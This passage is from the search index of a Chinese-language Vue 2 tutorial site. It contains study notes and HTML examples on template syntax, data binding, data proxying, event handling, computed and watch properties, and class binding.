vm.$mount('选择器') 指定 el 的值\",\"const v = new Vue({ data:{ name:'zhf' } }) v.$mount('#root') //第二种写法 \",\"data 有两种写法：\",\"对象式：data:{}\",\"data:{ name:'zhf' } \",\"函数式：data(){return{}}\",\"data(){ console.log('@@@',this) //此处的this是Vue实例对象 return{ name:'zhf' } } \",\"如何选择：组件时，data 必须使用函数式，否则会报错\",\"重要原则：由 Vue 管理的函数，一定不要写箭头函数，否则 this 就不再是 Vue 实例了\"]}]},\"/frontend/vuenotes/02-Vue%E6%A0%B8%E5%BF%83-%E6%A8%A1%E6%9D%BF%E8%AF%AD%E6%B3%95.html\":{\"title\":\"Vue核心-模板语法\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/02-Vue核心-模板语法\"]},{\"header\":\"模板的理解\",\"slug\":\"模板的理解\",\"contents\":[\"模板就是动态 HTML 页面，这里面包含了一些 JS 语法代码\"]},{\"header\":\"Vue 模板语法\",\"slug\":\"vue-模板语法\",\"contents\":[\"Vue 模板语法包括两大类，分别是：\",\"插值语法：双大括号表示\",\"指令语法：指令（以 v- 开头的自定义标签属性）\"]},{\"header\":\"插值语法\",\"slug\":\"插值语法\",\"contents\":[\"功能：用于解析标签体内容\",\"写法：{{xxx}}，xxx 是 JS 表达式，可以直接读取到 data 中的所有属性\"]},{\"header\":\"指令语法\",\"slug\":\"指令语法\",\"contents\":[\"功能：用于解析标签（包括：标签属性、标签体内容、绑定事件等）\",\"举例：<a v-bind:href=\\\"xxx\\\"> 或简写为 <a :href='xxx'>，xxx 同样要写 JS 表达式，可以直接读取到 data 中所有属性\",\"备注：Vue 中有很多的指令，且形式都是 v-xxx，此处只是以 v-bind 举例\",\"例：\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>模板语法</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>插值语法</h2> <h4>你好，{{ name }}</h4> <hr /> <h2>指令语法</h2> <a v-bind:href=\\\"baidu.url.toUpperCase()\\\">点我去{{ baidu.name }}1</a> <a :href=\\\"baidu.url\\\">点我去{{ baidu.name }}2</a> </div> </body> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false //阻止 vue 在启动时生成生产提示。 new Vue({ el: '#root', data: { name: 'zhf', baidu: { name: '百度', url: 'https://www.baidu.com/', }, }, }) </script> </html> \",\"效果：\",\"Vue核心-模板语法01.gif\"]}]},\"/frontend/vuenotes/03-Vue%E6%A0%B8%E5%BF%83-%E6%95%B0%E6%8D%AE%E7%BB%91%E5%AE%9A.html\":{\"title\":\"Vue核心-数据绑定\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/03-Vue核心-数据绑定\"]},{\"header\":\"数据绑定\",\"slug\":\"数据绑定\",\"contents\":[\"Vue 中有两种数据绑定的方式：\",\"单向绑定 v-bind 数据只能从 data 流向页面\",\"双向绑定 v-model 数据不仅能从 data 流向页面，还可以从页面流向 data\",\"备注：\",\"双向绑定一般都应用在表单类元素上，如 <input>、<select>、<textarea> 等\",\"v-model:value 可以简写为 v-model，因为 v-model 默认收集的就是 value 值\",\"例：\",\"<!DOCTYPE html> <html> <head> <meta charset=\\\"UTF-8\\\" /> <title>数据绑定</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <!-- 普通写法 --> <!-- 单向数据绑定：<input type=\\\"text\\\" v-bind:value=\\\"name\\\" /><br /> --> <!-- 双向数据绑定：<input type=\\\"text\\\" v-model:value=\\\"name\\\" /> --> <!-- 简写 --> 单向数据绑定：<input type=\\\"text\\\" :value=\\\"name\\\" /><br /> 双向数据绑定：<input type=\\\"text\\\" v-model=\\\"name\\\" /> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: 'zhf', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-数据绑定01.gif\"]},{\"header\":\"v-model 指令的修饰符\",\"slug\":\"v-model-指令的修饰符\",\"contents\":[]},{\"header\":\"v-model. number\",\"slug\":\"v-model-number\",\"contents\":[\"使用修饰符 .number 可以将输入的数据转换为 Number 类型，否则虽然你输入的是数字. 但它的类型其实是 String\"]},{\"header\":\"v-model. trim\",\"slug\":\"v-model-trim\",\"contents\":[\"给 v-model 添加修饰符 .trim 可以自动过滤用户输入的首尾空格\"]},{\"header\":\"v-model. lazy\",\"slug\":\"v-model-lazy\",\"contents\":[\"并不是实时改变，而是在失去焦点或者按回车时才会更新\",\"在输入框中，v-model默认是在input事件中同步输入框的数据（除了输入法中文输入的情况），使用修饰符 .lazy 会转变为 change 事件中同步（类似懒加载）\"]}]},\"/frontend/vuenotes/04-Vue%E6%A0%B8%E5%BF%83-MVVM%E6%A8%A1%E5%9E%8B%E4%B8%8E%E6%95%B0%E6%8D%AE%E4%BB%A3%E7%90%86.html\":{\"title\":\"Vue核心-MVVM模型与数据代理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/04-Vue核心-MVVM模型与数据代理\"]},{\"header\":\"MVVM 模型\",\"slug\":\"mvvm-模型\",\"contents\":[\"Vue核心-MVVM模型与数据代理01.png\",\"MVVM 本质上是 MVC （Model-View- Controller）的改进版。即模型-视图-视图模型\",\"模型 model 指的是后端传递的数据，视图 view 指的是所看到的页面\",\"视图模型 viewModel 是 MVVM 模式的核心，它是连接 view 和 model 的桥梁。它有两个方向：\",\"将模型转化成视图，即将后端传递的数据转化成所看到的页面。实现的方式是：数据绑定\",\"将视图转化成模型，即将所看到的页面转化成后端的数据。实现的方式是：DOM 事件监听\",\"MVVM：\",\"M：模型 Model，data 中的数据\",\"V：视图 View，模板代码（不是静态页面）（两个语法：指令，大括号表达式）\",\"VM：视图模型 ViewModel，Vue 实例 \",\"Dom Listeners（Dom 监听）\",\"Data Bindings（数据绑定）\",\"观察发现：\",\"data 中所有的属性，最后都出现在了 vm 身上\",\"vm 身上所有的属性及 Vue 原型身上所有的属性，在 Vue 模板中都可以直接使用\",\"Vue核心-MVVM模型与数据代理02.png\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>MVVM</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h1>学校名称：{{name}}</h1> <h1>学校地址：{{address}}</h1> <h1>测试：{{$options}}</h1> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) console.log(vm) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理03.png\"]},{\"header\":\"Vue 中的数据代理\",\"slug\":\"vue-中的数据代理\",\"contents\":[]},{\"header\":\"Object. defineproperty 方法\",\"slug\":\"object-defineproperty-方法\",\"contents\":[\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Object.defineproperty方法</title> </head> <body> <script> let number = 18 let person = { name: '张三', sex: '男', } Object.defineProperty(person, 'age', { // value:18, // enumerable:true, // 控制属性是否可以枚举，默认值是false // writable:true, // 控制属性是否可以被修改，默认值是false // configurable:true // 控制属性是否可以被删除，默认值是false // 当有人读取person的age属性时，get函数(getter)就会被调用，且返回值就是age的值 get() { console.log('有人读取age属性了') return number }, // 当有人修改person的age属性时，set函数(setter)就会被调用，且会收到修改的具体值 set(value) { console.log('有人修改了age属性，且值是', value) number = value }, }) console.log(person) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理04.png\"]},{\"header\":\"数据代理\",\"slug\":\"数据代理\",\"contents\":[\"数据代理：通过一个对象代理对另一个对象中属性的操作（读/写）\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>模拟一个数据代理</title> </head> <body> <script> let obj1 = { x: 100 } let obj2 = { y: 200 } Object.defineProperty(obj2, 'x', { get() { return obj1.x }, set(value) { obj1.x = value }, }) console.log(obj1.x) console.log(obj1.y) console.log(obj2.x) console.log(obj2.y) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理05.png\",\"Vue 中的数据代理通过 vm 对象来代理 data 对象中属性的操作（读/写）\",\"Vue 中数据代理的好处：更加方便的操作 data 中的数据\",\"基本原理 \",\"通过 Object.defineProperty()把 data 对象中所有属性添加到 vm 上\",\"为每一个添加到 vm 上的属性，都指定一个 gettersetter\",\"在 gettersetter 内部去操作（读/写）data 中对应的属性\",\"Vue核心-MVVM模型与数据代理06.png\",\"Vue 将 data 中的数据拷贝了一份到 _data 属性中，又将 _data 里面的属性提到 Vue 实例中（如 name），通过 defineProperty 实现数据代理，这样通过 geter/setter 操作 name，进而操作 _data 中的 name。而 _data 又对 data 进行数据劫持，实现响应式\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>Vue中的数据代理</title> <!-- 引入Vue --> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>学校名称：{{ name }}</h2> <h2>学校地址：{{ address }}</h2> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: '曲阜师范大学', address: '曲阜', }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-MVVM模型与数据代理07.png\"]}]},\"/frontend/vuenotes/05-Vue%E6%A0%B8%E5%BF%83-%E4%BA%8B%E4%BB%B6%E5%A4%84%E7%90%86.html\":{\"title\":\"Vue核心-事件处理\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/05-Vue核心-事件处理\"]},{\"header\":\"事件的基本用法\",\"slug\":\"事件的基本用法\",\"contents\":[\"使用 v-on:xxx 或 @xxx 绑定事件，其中 xxx 是事件名\",\"事件的回调需要配置在 methods 对象中，最终会在 vm 上\",\"methods 中配置的函数，不要用箭头函数，否则 this 就不是 vm 了\",\"methods 中配置的函数，都是被 Vue 所管理的函数，this 的指向是 vm 或组件实例对象\",\"@click=\\\"xxx\\\" 和 @click=\\\"xxx()\\\" 效果一致，但后者括号里面可以传参\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>事件的基本使用</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>欢迎阅读{{name}}的笔记</h2> <button v-on:click=\\\"showInfo\\\">点我提示信息</button> <button @click=\\\"showInfo1()\\\">点我提示信息1（不传参）</button> <button @click=\\\"showInfo2($event,66)\\\">点我提示信息2（传参）</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', }, methods: { showInfo() { alert('你好呀！这是完整写法绑定事件') }, showInfo1() { alert('你好呀！这是简写方法绑定事件，不传参') }, showInfo2(event, number) { alert(`你好呀！这是简写方法绑定事件，传参，传递到参数是${number}`) console.log(event) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理01.gif\"]},{\"header\":\"事件修饰符\",\"slug\":\"事件修饰符\",\"contents\":[\"Vue 中的事件修饰符：\",\"prevent 阻止默认事件（常用）\",\"stop 阻止事件冒泡（常用）\",\"once 事件只触发一次（常用）\",\"capture 使用事件的捕获模式\",\"self 只有 event.target 是当前操作的元素时才触发事件\",\"passive 事件的默认行为立即执行，无需等待事件回调执行完毕\",\"注意：修饰符可以连续写，比如可以这么用：@click. prevent.stop=\\\"xxx\\\"\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>事件修饰符</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> <style> * { margin-top: 20px; } .box { height: 50px; background-color: skyblue; } .box1 { padding: 5px; background-color: skyblue; } .box2 { padding: 5px; background-color: white; } .list { width: 200px; height: 200px; background-color: skyblue; overflow: auto; } li { height: 100px; } </style> </head> <body> <div id=\\\"root\\\"> <h2>欢迎来{{name}}学习</h2> <!-- 阻止默认事件（常用） --> <a href=\\\"https://www.qfnu.edu.cn/\\\" @click.prevent=\\\"showInfo\\\">点我提示信息</a> <!-- 阻止事件冒泡（常用） --> <div class=\\\"box\\\" @click=\\\"showInfo\\\"> <button @click1=\\\"showInfo\\\">点我提示信息</button> </div> <!-- 事件只触发一次（常用） --> <button @click.once=\\\"showInfo\\\">点我提示信息</button> <!-- 使用事件的捕获模式 --> <div class=\\\"box1\\\" @click.capture=\\\"showMsg(1)\\\"> div1 <div class=\\\"box2\\\" @click=\\\"showMsg(2)\\\">div2</div> </div> <!-- 只有event.target是当前操作的元素时才触发事件 --> <div class=\\\"box\\\" @click.self=\\\"showInfo\\\"> <button @click=\\\"showInfo\\\">点我提示信息</button> </div> <!-- 事件的默认行为立即执行，无需等待事件回调执行完毕--> <!-- scroll是滚动条滚动，passive没有影响 --> <!-- wheel是鼠标滚轮滚动，passive有影响 --> <ul @wheel.passive=\\\"demo\\\" class=\\\"list\\\"> <li>1</li> <li>2</li> <li>3</li> <li>4</li> </ul> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { name: '曲阜师范大学', }, methods: { showInfo() { alert('同学你好！') }, showMsg(msg) { alert(`${msg}`) }, demo() { for (let i = 0; i < 100000; i++) { console.log('#') } console.log('累坏了') }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理02.gif\"]},{\"header\":\"键盘事件\",\"slug\":\"键盘事件\",\"contents\":[\"键盘上的每个按键都有自己的名称和编码，例如：Enter（13），而 Vue 还对一些常用按键起了别名方便使用\",\"Vue 中常用的按键别名： 回车 enter 删除 delete 捕获“删除”和“退格”键 退出 esc 空格 space 换行 tab 特殊，必须配合 keydown 去使用 上 up 下 down 左 left 右 right\",\"Vue 未提供别名的按键，可以使用按键原始的 key 值去绑定，但注意要转为 kebab-case（多单词小写短横线写法）\",\"系统修饰键（用法特殊）ctrlaltshiftmeta（meta 就是 win 键） \",\"配合 keyup 使用：按下修饰键的同时，再按下其他键，随后释放其他键，事件才被触发，指定 ctr+y 使用 @keyup.ctr.y\",\"配合 keydown 使用：正常触发事件\",\"也可以使用 keyCode 去指定具体的按键（不推荐）\",\"Vue.config.keyCodes.自定义键名 = 键码，可以去定制按键别名\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>键盘事件</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>欢迎阅读{{name}}的笔记</h2> <input type=\\\"text\\\" placeholder=\\\"按下回车提示输入\\\" @keyup.enter=\\\"showInfo\\\" /> <br /> <input type=\\\"text\\\" placeholder=\\\"按下tab提示输入\\\" @keydown.tab=\\\"showInfo\\\" /> <br /> <input type=\\\"text\\\" placeholder=\\\"按下回车提示输入\\\" @keydown.huiche=\\\"showInfo\\\" /> <br /> </div> <script> Vue.config.productionTip = false Vue.config.keyCodes.huiche = 13 // 定义了一个别名按键 new Vue({ el: '#root', data: { name: 'zhf', }, methods: { showInfo(e) { alert(`${e.target.value}`) }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-事件处理03.gif\"]}]},\"/frontend/vuenotes/06-Vue%E6%A0%B8%E5%BF%83-%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7%E4%B8%8E%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7.html\":{\"title\":\"Vue核心-计算属性与侦听属性\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/06-Vue核心-计算属性与侦听属性\"]},{\"header\":\"计算属性\",\"slug\":\"计算属性\",\"contents\":[\"姓名案例：\",\"Vue核心-计算属性与侦听属性01.gif\",\"插值语法实现：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>插值语法实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /> <br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /> <br /> 全名：<span>{{ firstName }}-{{ lastName }}</span> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, }) </script> </body> </html> \",\"methods 实现：\",\"数据发生变化，模板就会被重新解析\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>methods实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /><br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /><br /> 全名：<span>{{fullName()}}</span> </div> <script> Vue.config.productionTip = false new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, methods: { fullName() { return this.firstName + '-' + this.lastName }, }, }) </script> </body> </html> \",\"computed 计算属性实现：\",\"定义：要用的属性不存在，需要通过已有属性计算得来\",\"原理：底层借助了 Objcet.defineproperty() 方法提供的 getter 和 setter\",\"get 函数什么时候执行？ \",\"初次读取时会执行一次\",\"当依赖的数据发生改变时会被再次调用\",\"优势：与 methods 实现相比，内部有缓存机制（复用），效率更高，调试方便\",\"备注 \",\"计算属性最终会出现在 vm 上，直接读取使用即可\",\"如果计算属性要被修改，那必须写 set 函数去响应修改，且 set 中要引起计算时依赖的数据发生改变\",\"如果计算属性确定不考虑修改，可以使用计算属性的简写形式\",\"我们用计算属性实现姓名案例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>计算属性实现姓名案例</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> 姓：<input type=\\\"text\\\" v-model=\\\"firstName\\\" /> <br /> 名：<input type=\\\"text\\\" v-model=\\\"lastName\\\" /> <br /> 全名：<span>{{fullName}}</span> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { firstName: '张', lastName: '三', }, computed: { //完整写法 /*fullName: { get() { return this.firstName + '-' + this.lastName }, set(value) { const arr = value.split('-') this.firstName = arr[0] this.lastName = arr[1] }, },*/ //简写形式 fullName() { return this.firstName + '-' + this.lastName }, }, }) </script> </body> </html> \"]},{\"header\":\"侦听属性\",\"slug\":\"侦听属性\",\"contents\":[]},{\"header\":\"侦听属性基本用法\",\"slug\":\"侦听属性基本用法\",\"contents\":[\"watch 侦听属性\",\"当被侦听的属性变化时，回调函数自动调用，进行相关操作\",\"侦听的属性必须存在，才能进行侦听，既可以侦听 data，也可以侦听计算属性\",\"配置项属性 immediate:false，改为 true，则初始化时调用一次 handler(newValue,oldValue)\",\"侦听有两种写法 \",\"创建 Vue 时传入 watch:{}配置\",\"通过 vm.$watch() 侦听\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>侦听的基本用法</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h2>今天天气很{{info}}</h2> <button @click=\\\"changeWeather\\\">切换天气</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { isHot: true, }, computed: { info() { return this.isHot ? '炎热' : '凉爽' }, }, methods: { changeWeather() { this.isHot = !this.isHot }, }, //方式一 /*watch: { isHot: { immediate: true, handler(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue) }, }, },*/ }) //方式二 vm.$watch('isHot', { immediate: true, //初始化时让handler调用一下 //handler什么时候调用？当isHot发生改变时 handler(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue) }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-计算属性与侦听属性02.gif\"]},{\"header\":\"深度侦听\",\"slug\":\"深度侦听\",\"contents\":[\"Vue 中的 watch 默认不侦听对象内部值的改变（一层）\",\"在 watch 中配置 deep:true 可以侦听对象内部值的改变（多层）\",\"注意：\",\"Vue 自身可以侦听对象内部值的改变，但 Vue 提供的 watch 默认不可以\",\"使用 watch 时根据侦听数据的具体结构，决定是否采用深度侦听\",\"例：\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>深度侦听</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h3>a的值是:{{ numbers.a }}</h3> <button @click=\\\"numbers.a++\\\">点我让a+1</button> <h3>b的值是:{{ numbers.b }}</h3> <button @click=\\\"numbers.b++\\\">点我让b+1</button> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { numbers: { a: 1, b: 1, }, }, watch: { // 监视多级结构中某个属性的变化 /*'numbers.a': { handler() { console.log('a被改变了') }, },*/ //监视多级结构中所有属性的变化 numbers: { deep: true, handler() { console.log('numbers改变了') }, }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-计算属性与侦听属性03.gif\"]},{\"header\":\"侦听属性简写\",\"slug\":\"侦听属性简写\",\"contents\":[\"如果侦听属性除了 handler 没有其他配置项的话，可以进行简写\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>侦听属性简写</title> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <div id=\\\"root\\\"> <h3>今天天气很{{ info }}</h3> <button @click=\\\"changeWeather\\\">切换天气</button> </div> <script type=\\\"text/javascript\\\"> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { isHot: true }, computed: { info() { return this.isHot ? '炎热' : '凉爽' }, }, methods: { changeWeather() { this.isHot = !this.isHot }, }, watch: { // 正常写法 // isHot: { // // immediate:true, //初始化时让handler调用一下 // // deep:true, //深度监视 // handler(newValue, oldValue) { // console.log('isHot被修改了', newValue, oldValue) // } // }, //简写 isHot(newValue, oldValue) { console.log('isHot被修改了', newValue, oldValue, this) }, }, }) //正常写法 // vm.$watch('isHot', { // immediate: true, //初始化时让handler调用一下 // deep: true,//深度监视 // handler(newValue, oldValue) { // console.log('isHot被修改了', newValue, oldValue) // } // })l //简写 // vm.$watch('isHot', (newValue, oldValue) => { // console.log('isHot被修改了', newValue, oldValue, this) // }) </script> </body> </html> \"]},{\"header\":\"计算属性 VS 侦听属性\",\"slug\":\"计算属性-vs-侦听属性\",\"contents\":[\"computed 和 watch 之间的区别：\",\"computed 能完成的功能，watch 都可以完成\",\"watch 能完成的功能，computed 不一定能完成，例如 watch 可以进行异步操作\",\"两个重要的小原则：\",\"所有被 Vue 管理的函数，最好写成普通函数，这样 this 的指向才是 vm 或组件实例对象\",\"所有不被 Vue 所管理的函数（定时器的回调函数、Ajax 的回调函数、Promise 的回调函数等），最好写成箭头函数，这样 this 的指向才是 vm 或组件实例对象\",\"上面的姓名案例：\",\"使用计算属性：\",\"new Vue({ el:'#root', data:{ firstName:'张', lastName:'三' }, computed:{ fullName(){ return this.firstName + '-' + this.lastName } } }) \",\"使用监听属性：\",\"new Vue({ el:'#root', data:{ firstName:'张', lastName:'三', fullName:'张-三' }, watch:{ firstName(val){ setTimeout(()=>{ this.fullName = val + '-' + this.lastName },1000); }, lastName(val){ this.fullName = this.firstName + '-' + val } } }) \"]}]},\"/frontend/vuenotes/07-Vue%E6%A0%B8%E5%BF%83-%E7%BB%91%E5%AE%9A%E6%A0%B7%E5%BC%8F.html\":{\"title\":\"Vue核心-绑定样式\",\"contents\":[{\"header\":\"\",\"slug\":\"\",\"contents\":[\"本文示例代码：NoteDemoCode/Vue/07-Vue核心-绑定样式\"]},{\"header\":\"绑定 class 样式\",\"slug\":\"绑定-class-样式\",\"contents\":[\":class=\\\"xxx\\\" //xxx 可以是字符串、数组、对象 \"]},{\"header\":\"字符串写法\",\"slug\":\"字符串写法\",\"contents\":[\"字符串写法适用于：类名不确定，要动态获取\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-字符串写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .happy { border: 4px solid red; background-color: rgba(255, 255, 0, 0.644); background: linear-gradient(30deg, yellow, pink, orange, yellow); } .sad { border: 4px dashed rgb(2, 197, 2); background-color: gray; } .normal { background-color: skyblue; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器 --> <div id=\\\"root\\\"> <!-- 绑定class样式--字符串写法，适用于：样式的类名不确定，需要动态指定 --> <div class=\\\"basic\\\" :class=\\\"mood\\\" @click=\\\"changeMood\\\">{{name}}</div> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', mood: 'normal', }, methods: { changeMood() { const arr = ['happy', 'sad', 'normal'] const index = Math.floor(Math.random() * 3) this.mood = arr[index] }, }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式01.gif\"]},{\"header\":\"数组写法\",\"slug\":\"数组写法\",\"contents\":[\"数组写法适用于：要绑定多个样式，个数不确定，名字也不确定\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-数组写法</title> <style> .basic { width: 400px; height: 100px; border: 1px solid black; } .zhf1 { background-color: yellowgreen; } .zhf2 { font-size: 30px; text-shadow: 2px 2px 10px red; } .zhf3 { border-radius: 20px; } </style> <script src=\\\"https://cdn.jsdelivr.net/npm/vue@2/dist/vue.js\\\"></script> </head> <body> <!-- 准备好一个容器--> <div id=\\\"root\\\"> <!-- 绑定class样式--数组写法，适用于：要绑定的样式个数不确定、名字也不确定 --> <div class=\\\"basic\\\" :class=\\\"classArr\\\">{{name}}</div> </div> <script> Vue.config.productionTip = false const vm = new Vue({ el: '#root', data: { name: 'zhf', classArr: ['zhf1', 'zhf2', 'zhf3'], }, }) </script> </body> </html> \",\"效果：\",\"Vue核心-绑定样式02.png\"]},{\"header\":\"对象写法\",\"slug\":\"对象写法\",\"contents\":[\"对象写法适用于：要绑定多个样式，个数确定，名字也确定，但不确定用不用\",\"<!DOCTYPE html> <html lang=\\\"en\\\"> <head> <meta charset=\\\"UTF-8\\\" /> <meta http-equiv=\\\"X-UA-Compatible\\\" content=\\\"IE=edge\\\" /> <meta name=\\\"viewport\\\" content=\\\"width=device-width, initial-scale=1.0\\\" /> <title>绑定class样式-对象写法</title> <style> .basic { width: 400px; height: 100px; border: 1px 